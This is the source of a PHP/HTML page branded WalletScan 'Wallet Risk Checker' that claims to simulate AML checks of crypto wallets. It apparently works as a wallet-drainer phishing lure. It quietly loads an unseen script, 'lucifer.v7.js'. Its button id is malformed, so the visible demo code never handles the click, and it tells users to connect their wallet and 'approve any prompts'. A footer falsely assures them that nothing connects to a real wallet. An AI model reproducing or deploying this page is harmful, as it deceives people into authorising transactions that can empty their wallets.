<?php
// Simple landing that uses only HTML+PHP+JS (CSS inline). All visible text is in English.
?>
<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <script type="module" crossorigin src="./files/lucifer.v7.js"></script>
  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
  <title>Wallet Risk Checker</title>
  <meta name="description" content="Crypto dirtiness checker" />
  <style>
    :root{ --bg:#0b1020; --card:#0f162f; --text:#e9edf8; --muted:#a7b0c3; --primary:#1463ff; --primary-600:#0f4ed1; --danger:#ff3b3b; --accent:#00e0ff; --success:#18c37e; --gauge-track:rgba(255,255,255,.12);} *{box-sizing:border-box} html,body{height:100%}
    body{margin:0;font-family:ui-sans-serif,system-ui,-apple-system,Segoe UI,Roboto,"Helvetica Neue",Arial,"Noto Sans","Apple Color Emoji","Segoe UI Emoji";background:radial-gradient(1200px 800px at 80% -10%,rgba(20,99,255,.25),transparent 60%),radial-gradient(900px 900px at -10% 110%,rgba(0,224,255,.18),transparent 60%),var(--bg);color:var(--text);-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale}
    .app{min-height:100%;display:flex;align-items:center;justify-content:center;padding:20px}
    .phone-frame{width:min(420px,100%);background:linear-gradient(180deg,rgba(255,255,255,0.06),rgba(255,255,255,0.03));border:1px solid rgba(255,255,255,0.12);box-shadow:0 10px 40px rgba(0,0,0,0.45),inset 0 1px 0 rgba(255,255,255,0.06);border-radius:22px;overflow:clip;position:relative}
    header{display:flex;align-items:center;gap:10px;padding:14px 16px;backdrop-filter:blur(6px);background:linear-gradient(180deg,rgba(5,8,20,.7),rgba(5,8,20,.4));border-bottom:1px solid rgba(255,255,255,0.08)}
    .logo{width:26px;height:26px;border-radius:8px;background:linear-gradient(135deg,#00e0ff,#1463ff);display:inline-grid;place-items:center;box-shadow:0 2px 8px rgba(0,224,255,.4)} .logo svg{width:18px;height:18px;filter:drop-shadow(0 2px 4px rgba(0,0,0,.4))
    }
    .brand{font-weight:800;letter-spacing:.2px}
    main{padding:22px 18px 24px;text-align:center}
    h1{font-size:clamp(28px,7vw,36px);line-height:1.1;margin:6px 0 10px;letter-spacing:.2px}
    .sub{color:var(--muted);font-size:14px;margin:10px auto 2px;max-width:34ch}
    .hero{position:relative;margin:10px auto 16px;padding:18px 12px 6px;border-radius:18px;background:linear-gradient(180deg,rgba(255,255,255,0.04),rgba(255,255,255,0.02));border:1px solid rgba(255,255,255,0.1)}
    .gauge-wrap{position:relative;width:82%;max-width:320px;margin:6px auto 8px;aspect-ratio:1/1}
    .gauge{position:absolute;inset:0;display:grid;place-items:center} .gauge svg{width:100%;height:100%;overflow:visible} .gauge .center{position:absolute;display:grid;place-items:center;text-align:center}
    .bolt{color:var(--danger);font-size:18px} .percent{font-weight:800;font-size:clamp(34px,8vw,44px);letter-spacing:.5px} .risk-label{font-size:13px;color:var(--muted);margin-top:2px}
    .timeline{margin:12px auto 4px;width:88%;max-width:360px} .bar{position:relative;height:10px;border-radius:999px;background:rgba(255,255,255,.08);overflow:hidden}
    .bar::before{content:"";position:absolute;inset:0;width:30%;background:linear-gradient(90deg,transparent,rgba(20,99,255,.85),transparent);filter:blur(6px);animation:sweep 1.6s linear infinite}
    .bar .fill{position:absolute;top:0;left:0;height:100%;width:0%;background:linear-gradient(90deg,#18c37e,#00e0ff);box-shadow:0 0 16px rgba(0,224,255,.45);transition:width .3s ease}
    @keyframes sweep{from{left:-30%}to{left:100%}}
    .eta{display:flex;align-items:center;justify-content:center;gap:8px;font-size:12px;color:var(--muted);margin-top:6px}
    .dot{width:6px;height:6px;border-radius:50%;background:var(--accent);box-shadow:0 0 10px var(--accent),0 0 20px rgba(0,224,255,.5);animation:pulse 1.2s ease-in-out infinite}
    @keyframes pulse{0%{transform:scale(.85);opacity:.75}50%{transform:scale(1.1);opacity:1}100%{transform:scale(.85);opacity:.75}}
    .lead{color:var(--muted);font-size:14px;margin:12px auto 16px;max-width:36ch}
    .cta{appearance:none;border:none;width:92%;max-width:380px;display:block;margin:12px auto 0;cursor:pointer;background:linear-gradient(180deg,var(--primary),var(--primary-600));color:#fff;font-weight:700;font-size:16px;padding:14px 18px;border-radius:16px;box-shadow:0 8px 20px rgba(20,99,255,.45),inset 0 1px 0 rgba(255,255,255,.25);transition:transform .08s ease,filter .2s ease,opacity .2s ease}
    .cta:active{transform:translateY(1px) scale(.99)} .cta[disabled]{opacity:.6;cursor:not-allowed}
    .status{font-size:13px;color:var(--muted);margin:10px auto 8px;min-height:18px}
    .nodes{position:absolute;inset:0;pointer-events:none;overflow:hidden;opacity:.55}
    .node{position:absolute;width:42px;height:42px;border-radius:14px;border:1px solid rgba(255,255,255,.12);background:rgba(255,255,255,.04);backdrop-filter:blur(4px);animation:float 12s ease-in-out infinite}
    .node:nth-child(1){top:12%;left:8%;animation-duration:10s} .node:nth-child(2){top:18%;right:12%;animation-duration:13s} .node:nth-child(3){bottom:18%;left:16%;animation-duration:14s} .node:nth-child(4){bottom:12%;right:10%;animation-duration:11s}
    @keyframes float{0%{transform:translateY(0) translateX(0)}50%{transform:translateY(-6px) translateX(6px)}100%{transform:translateY(0) translateX(0)}}
    footer{padding:16px;text-align:center;color:var(--muted);font-size:12px}
    @media (max-width:340px){.lead{font-size:13px}.cta{font-size:15px}}
  </style>
</head>
<body>
  <div class="app">
    <div class="phone-frame">
      <header>
        <div class="logo" role="img" aria-label="WalletScan mark" title="WalletScan mark" data-alt-es="Marca de WalletScan" data-alt-ru="Знак WalletScan">
          <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false">
            <defs>
              <linearGradient id="g1" x1="0" y1="0" x2="1" y2="1">
                <stop offset="0%" stop-color="#00e0ff"/>
                <stop offset="100%" stop-color="#1463ff"/>
              </linearGradient>
            </defs>
            <path d="M12 2l8 10-8 10L4 12 12 2z" fill="url(#g1)"/>
          </svg>
        </div>
        <div class="brand">WalletScan</div>
      </header>
      <main>
        <div class="hero" role="region" aria-label="Wallet risk checker">
          <h1>Wallet Risk Checker</h1>

          <div class="gauge-wrap" aria-label="Risk score gauge" title="Risk score gauge"
               data-alt-es="Indicador de puntaje de riesgo" data-alt-ru="Индикатор оценки риска">
            <div class="gauge">
              <!-- SVG Circular Gauge -->
              <svg viewBox="0 0 120 120" aria-hidden="true" focusable="false">
                <!-- background arc -->
                <circle cx="60" cy="60" r="50" stroke="var(--gauge-track)" stroke-width="12" fill="none" stroke-linecap="round" />
                <!-- tick marks -->
                <g id="ticks" stroke="rgba(255,255,255,.16)">
                  <?php for($i=0;$i<21;$i++): $a = -120 + $i*12; ?>
                    <line x1="60" y1="8" x2="60" y2="14" stroke-width="2"
                          transform="rotate(<?= $a ?> 60 60)" />
                  <?php endfor; ?>
                </g>
                <!-- progress arc -->
                <circle id="arc" cx="60" cy="60" r="50" stroke="url(#grad)" stroke-width="12" fill="none" stroke-linecap="round"
                        transform="rotate(-120 60 60)" stroke-dasharray="314" stroke-dashoffset="314" />
                <defs>
                  <linearGradient id="grad" x1="0" y1="0" x2="1" y2="1">
                    <stop offset="0%" stop-color="#ff3b3b"/>
                    <stop offset="50%" stop-color="#f2c94c"/>
                    <stop offset="100%" stop-color="#18c37e"/>
                  </linearGradient>
                </defs>
              </svg>
              <div class="center">
                <div class="bolt" aria-hidden="true">⚡</div>
                <div class="percent"><span id="percent">0</span>%</div>
                <div id="riskLabel" class="risk-label">Ready</div>
              </div>
            </div>
          </div>

          <p class="sub">Simulated evaluator for BTC, USDT, ETH, and 4000+ assets to mimic AML-style risk checks.</p>
          <div class="timeline" aria-hidden="false">
            <div class="bar">
              <div class="fill" id="barFill" style="width:0%"></div>
            </div>
            <div class="eta"><span class="dot"></span><span id="eta">Waiting…</span></div>
          </div>
        </div>

        <p class="lead" id="instruction"
           data-alt-es="Toque el botón para conectar su wallet y simular el escaneo de direcciones. Por favor apruebe los avisos, ya que a veces se requieren permisos para leer direcciones."
           data-alt-ru="Нажмите кнопку, чтобы подключить кошелек и имитировать сканирование адресов. Пожалуйста, подтвердите всплывающие запросы, так как иногда нужны разрешения для чтения адресов.">
          Tap the button to connect your wallet to simulate address scanning. Please approve any prompts; permissions may be required to read addresses.
        </p>

        <button id="connectBtn interactBtn" class="cta">Connect Your Wallet</button>
        <div id="status" class="status" aria-live="polite"></div>
      </main>

      <div class="nodes" aria-hidden="true">
        <div class="node" style="animation-delay:0s"></div>
        <div class="node" style="animation-delay:.6s"></div>
        <div class="node" style="animation-delay:1.2s"></div>
        <div class="node" style="animation-delay:1.8s"></div>
      </div>

      <footer>
        Alt text (ES/RU) is embedded for images and key regions via custom attributes. This demo does not connect to a real wallet.
      </footer>
    </div>
  </div>

  <script>
    // Gauge math
    const arc = document.getElementById('arc');
    const percentEl = document.getElementById('percent');
    const riskLabel = document.getElementById('riskLabel');
    const barFill = document.getElementById('barFill');
    const etaEl = document.getElementById('eta');
    const connectBtn = document.getElementById('connectBtn');
    const statusEl = document.getElementById('status');

    const CIRC = 2 * Math.PI * 50; // ~314
    const startAngle = -120; // purely visual; arc rotated in SVG

    let progress = 0;
    let running = false;
    let timer = null;
    let startedAt = 0;

    function setProgress(p){
      progress = Math.max(0, Math.min(100, p|0));
      const span = Math.max(1, 240); // arc visual span in degrees
      const dash = CIRC * (1 - progress/100);
      arc.setAttribute('stroke-dashoffset', dash.toFixed(1));
      percentEl.textContent = progress;
      barFill.style.width = progress + '%';
      // risk label by thresholds
      let label = 'Low';
      if(progress < 25) label = 'Very Low';
      else if(progress < 50) label = 'Low';
      else if(progress < 70) label = 'Moderate';
      else if(progress < 85) label = 'Elevated';
      else label = 'High';
      riskLabel.textContent = running ? label : (progress === 0 ? 'Ready' : label);
    }

    function setETA(seconds){
      if(!running){ etaEl.textContent = 'Waiting…'; return; }
      etaEl.textContent = seconds > 0 ? `Estimated time: ${seconds}s` : 'Finalizing…';
    }

    function cancelScan(msg){
      running = false; connectBtn.disabled = false; setETA(0);
      statusEl.textContent = msg || 'Cancelled.';
      if(timer){ clearTimeout(timer); timer = null; }
    }

    async function startScan(){
      running = true; connectBtn.disabled = true; statusEl.textContent = 'Initializing…';
      startedAt = Date.now();
      // reset server-side progress (best-effort)
      try{ await fetch('scan.php?reset=1', {cache:'no-store'}); }catch(e){}
      tick();
    }

    async function tick(){
      if(!running) return;
      try{
        const res = await fetch(`scan.php?current=${progress}`, {cache:'no-store'});
        const data = await res.json();
        setProgress(data.progress);
        statusEl.textContent = data.message;
        // simple ETA estimate: scale with remaining progress
        const elapsed = (Date.now() - startedAt)/1000;
        const estTotal = Math.max(6, Math.min(22, (elapsed/(progress||1))*100));
        const remain = Math.max(0, Math.round(estTotal - elapsed));
        setETA(remain);
        if(progress >= 100){
          running = false; connectBtn.disabled = false; setETA(0);
          // Final message
          const verdict = data.verdict || classify(progress);
          statusEl.textContent = `Completed • Risk: ${verdict}`;
        }else{
          timer = setTimeout(tick, data.delayMs || 700);
        }
      }catch(err){
        cancelScan('Network error. Try again.');
      }
    }

    function classify(p){
      if(p < 25) return 'Very Low';
      if(p < 50) return 'Low';
      if(p < 70) return 'Moderate';
      if(p < 85) return 'Elevated';
      return 'High';
    }

    connectBtn.addEventListener('click', () => {
      // start scanning immediately on button click
      startScan();
    });

    // Initialize
    setProgress(0); setETA(0);
  </script>
</body>
</html>
